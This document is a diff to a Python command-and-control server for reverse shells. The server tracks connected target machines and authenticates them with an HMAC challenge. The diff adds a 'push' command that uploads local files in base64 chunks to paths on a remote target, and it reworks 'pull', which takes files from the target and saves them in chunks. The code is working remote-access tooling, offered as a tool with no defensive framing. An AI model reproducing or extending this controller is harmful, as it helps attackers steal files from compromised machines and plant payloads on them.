@@ -9,10 +9,12 @@ import struct
 import subprocess
 import sys
 from asyncio import CancelledError, IncompleteReadError
+from rich.progress import Progress, SpinnerColumn, TimeElapsedColumn
 from interactiveconsole import InteractiveConsole
 from targetsInfo import TargetInfo, Targets
 from pathlib import Path
 import argparse
+
 
 def parse_arguments():
     """
@@ -57,6 +59,7 @@ def parse_arguments():
 
     return parser.parse_args()
 
+
 async def send(writer: asyncio.StreamWriter, data: bytes):
     """
     Sends command to the target.
@@ -65,17 +68,91 @@ async def send(writer: asyncio.StreamWriter, data: bytes):
     writer.write(length + data)
     await writer.drain()
 
-async def save_file(save_path,file_name,file_data):
-    try:
-        binary_data = base64.b64decode(file_data)
-        save_path.write_bytes(binary_data)
-        console.output = f"[+] File '{file_name}' saved to {save_path}\n"+f"[+] File size: {len(binary_data):,} bytes"
 
-    except Exception as e:
-        console.error = f"[!] Failed to save file '{file_name}': {str(e)}"
+async def save_file(file_name,file_stat, data):
+    save_path = Path(targets.host_cwd) / file_name
+    if file_stat == 'start':
+        save_path.touch()
+        return
+    if file_stat == 'end':
+        console.output = (f"[+] File '{file_name}' saved to {save_path}\n"
+                          f"[+] File size: {save_path.stat().st_size} bytes")
+        return
+    if file_stat == 'sending':
+        file_data = base64.b64decode(data['data'])
+        with open(save_path, 'ab') as file:
+            file.write(file_data)
+    return
+
+
+async def upload(file, dpath, writer: asyncio.StreamWriter):
+    """
+    Asynchronously uploads a file to a remote target using a stream writer.
+
+    The function sends a JSON-encoded control message to initiate the transfer,
+    streams the file in base64-encoded chunks with real-time progress reporting,
+    and sends a final message indicating the end of the transfer. Errors such as
+    permission issues or missing files are gracefully handled.
+
+    Args:
+        file (str or Path): Path to the local file to be uploaded.
+        dpath (str): Remote destination path where the file should be stored.
+        writer (asyncio.StreamWriter): Stream writer used to send data to the target.
+
+    """
+    try:
+        # Open the file in binary read mode
+        with open(file, 'rb') as f:
+            chunk_size = 8192  # 8KB per chunk
+            total_size = Path(file).stat().st_size  # Get total size for progress tracking
+
+            console._clear_prompt()
+            console.line()
+            console.log(f'Transferring file {Path(file).name} to target host {targets.hostname} at address {targets.current_address}')
+            print()
+
+            # Show live progress bar during transferring
+            with Progress(
+                SpinnerColumn(),
+                *Progress.get_default_columns(),
+                TimeElapsedColumn(),
+            ) as progress:
+                task = progress.add_task("Uploading", total=total_size)
+
+                while True:
+                    # Read next chunk from file
+                    chunk = f.read(chunk_size)
+                    progress.update(task, advance=chunk_size)
+
+                    # If no more data, break the loop
+                    if not chunk:
+                        break
+
+                    # Encode chunk as base64 and send with 'sending' status
+                    encoded_data = base64.b64encode(chunk).decode('ascii')
+                    data = json.dumps(
+                        {'cmd': 'push', 'stat': 'sending', 'type': 'file', 'source_file': Path(file).name,
+                         'destination': dpath, 'data': encoded_data})
+                    await send(writer, data.encode('ascii'))
+        data = json.dumps(
+                {'cmd': 'push', 'stat': 'end', 'type': 'file', 'source_file': Path(file).name,'destination': dpath})
+        await send(writer, data.encode('ascii'))
+        print()
+        console.log(f'All files have been successfully transferred to {targets.hostname} at {targets.current_address}')
+        console.line()
+        return
+
+    # Handle common file-related errors gracefully
+    except IsADirectoryError:
+        console.error = f'{file} is a Directory'
+    except PermissionError:
+        console.error = f'Permission denied: {file}'
+    except FileNotFoundError:
+        console.error = f'No such file: {file}'
+    return
 
 def setup_data(data: bytes, address: str):
-    jdata = json.loads(data)
+    jdata = json.loads(data.decode('ascii'))
     targets.info[address].cwd = jdata['cwd']
     targets.info[address].hostname = jdata['hostname']
     targets.info[address].username = jdata['username']
@@ -132,6 +209,7 @@ async def perform_hmac_challenge(reader: asyncio.StreamReader, writer: asyncio.S
         console.error = "Secret key file missing or unreadable"
         return False
 
+
 async def handle_reverse_shell_connection(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
     """
     Handles an active reverse shell session with a connected client.
@@ -171,10 +249,15 @@ async def handle_reverse_shell_connection(reader: asyncio.StreamReader, writer: 
             if response['type']:
                 # Decode metadata and file content
                 file_info = json.loads(response['type'])
-                file_name = file_info['name']
-                file_data = file_info['data']
-                save_path = Path(resolve_path(targets.host_cwd)) / file_name
-                asyncio.create_task(save_file(save_path, file_name, file_data))
+                cmd = file_info['cmd']
+                file_stat = file_info['stat']
+                if cmd == 'push':
+                    dpath = file_info['destination_path']
+                    if file_stat == 'start':
+                        await upload(targets.uploading_file, dpath, writer)
+                elif cmd == 'pull':
+                    file_name = file_info['source_file']
+                    asyncio.create_task(save_file(file_name, file_stat, file_info))
 
 
     except CancelledError as cancel_err:
@@ -233,10 +316,14 @@ class TargetControlConsole:
                         " [+] clear                     - Clear the console output\n"
                         " [+] stop <int>                - Disconnect a target\n"
                         " [+] shutdown                  - Shut down the server and disconnect all targets\n"
-                        " [+] pull -s <target file> -d <destination storage>\n"                                      
+                        " [+] pull -s <target file> -d <destination storage>\n"
                         "   Options:\n"
                         "     -s <target file>          - Pull file from the specified target.\n"
                         "     -d <destination storage>  - Save the file to the specified location.\n"
+                        " [+] push -s <target file> -d <destination storage>\n"
+                        "   Options:\n"
+                        "     -s <target file>          - File to be pushed from the local system.\n"
+                        "     -d <destination storage>  - Remote destination where the file will be saved.\n"
                     )
                     continue
 
@@ -289,12 +376,15 @@ class TargetControlConsole:
                                 file = arg[index + 1]
                                 if '-d' in arg:
                                     index = arg.index('-d')
-                                    path = resolve_path(arg[index+1])
+                                    path = resolve_path(arg[index + 1])
                                     if not Path(path).exists():
                                         console.error = f'{path} does not exist'
                                         continue
                                     if not Path(path).is_dir():
                                         console.error = f'{path} is not a directory'
+                                        continue
+                                    if Path(path).owner() == 'root':
+                                        console.error = f'Permission denied: {path}'
                                         continue
                                     targets.host_cwd = path
 
@@ -303,6 +393,28 @@ class TargetControlConsole:
                             except (IndexError, ValueError):
                                 console.error = 'No file specified'
                                 continue
+                        elif command_lower == "push":
+                            if not '-s' in arg:
+                                console.error = 'No file specified'
+                                continue
+                            dpath = ''
+                            if '-d' in arg:
+                                index = arg.index('-d')
+                                try:
+                                    dpath = arg[index + 1]
+                                except (IndexError, ValueError):
+                                    dpath = ''
+                            try:
+                                index = arg.index('-s')
+                                file = resolve_path(arg[index + 1])
+                                targets.uploading_file = file
+                                # Send initial command to notify the receiver of an incoming file
+                                data = json.dumps(
+                                    {'cmd': 'push', 'stat': 'pending', 'type': 'file', 'source_file': Path(file).name,
+                                     'destination': dpath})
+                                await send(writer, data.encode('ascii'))
+                            except (IndexError, ValueError):
+                                console.error = 'No file specified'
                         else:
                             data = json.dumps({'cmd': command}).encode()
                             await send(writer, data)
